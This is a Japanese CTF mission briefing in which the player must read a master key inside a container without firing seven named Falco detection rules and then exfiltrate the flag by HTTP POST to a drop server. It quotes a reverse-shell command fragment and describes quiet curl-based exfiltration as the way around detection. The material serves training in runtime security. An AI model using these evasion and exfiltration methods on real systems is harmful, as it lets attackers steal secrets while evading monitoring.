┌──────────────────────────────────────────────────────────────────┐
│ CTF Company · Mission 10 — The Final Exfil  ★ BOSS ★             │
│ Type: EVADE · 難易度: ★★★★★                                      │
│ 回避すべき Falco ルール (7 つ):                                     │
│   01 Contact K8S API Server From Container                       │
│   02 Read sensitive file untrusted                               │
│   04 Search Private Keys or Passwords                            │
│   06 Run shell untrusted                                         │
│   07 Drop and execute new binary in container                    │
│   08 Redirect STDOUT/STDIN to Network Connection in Container    │
│   09 Create Hardlink Over Sensitive Files                        │
└──────────────────────────────────────────────────────────────────┘

# シナリオ

CTF Company の **master key** にようやく手が届いた。だが「読む」だけ
では任務は終わらない — 鍵を **箱の外の drop server へ持ち出して**
初めて exfiltration 完遂だ。そして CTF Company の Falco は読み取り・
探索・shell・永続化・C2・hardlink の **全方位** を見張っている。
**静かに読み、静かに持ち出せ。**

# ゴール

3 段すべてを満たすと solve:

  (1) master key を **発火させずに読む**
      /opt/nimbus/vault/master.key の中身 (Read-sensitive = 禁止)
  (2) 読んだ flag を **drop server (collector) へ HTTP で持ち出す**
  (3) `submit` で完了 — このミッションに取り組んでいる間、7 つの禁止
      ルールを 1 つも発火させておらず、かつ (2) の exfil が記録済みで
      あること。**一度でも発火させると、待っても解除されない** —
      Journey 画面の「このミッションをやり直す」ボタンでやり直す必要
      がある。**やり直すと exfil の記録も消えるので、(2) をもう一度
      行う必要がある。**

# 持ち出しの作法 (ここが本番)

ここまでの Mission で「何が発火するか」は学んだ。**派手な持ち出しは
すべて餌食**:

  reverse shell で抜く (bash -i >& /dev/tcp/...)   → C2 (Mission 08) 発火
  自前の exfil バイナリを drop して実行             → Drop+exec (Mission 07) 発火
  鍵を grep/find で漁る・hardlink で退避            → Search(04)/Hardlink(09) 発火

正解は **既存の curl で静かな HTTP POST**。collector は HTTP しか
受け付けないので、そもそも reverse shell では 1 バイトも届かない。

  collector(drop server):
    ${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil
  payload (JSON):
    {"user":"${FALCO_CTF_USER}","flag":"FALCO{...}"}

# 提出方法

  source /opt/ctf/submit.sh
  submit 10-final-exfil 'FALCO{...}'

レスポンス:
  {"correct":true,"evaded":true,"solved":true,...}      ← Operation 完遂
  {"correct":true,"evaded":false,"reason":"..."}         ← この attempt で発火済み(待っても解除されない。やり直しボタンでやり直す)
  {"correct":true,"exfiltrated":false,"reason":"..."}    ← exfil 未完了(先に collector へ)
  {"correct":false,"reason":"flag mismatch"}             ← flag 違い

# 環境にあるもの

  /opt/ctf/missions/10-final-exfil/fixtures/welcome.txt   ← このファイル
  /opt/ctf/submit.sh                                       ← source して submit
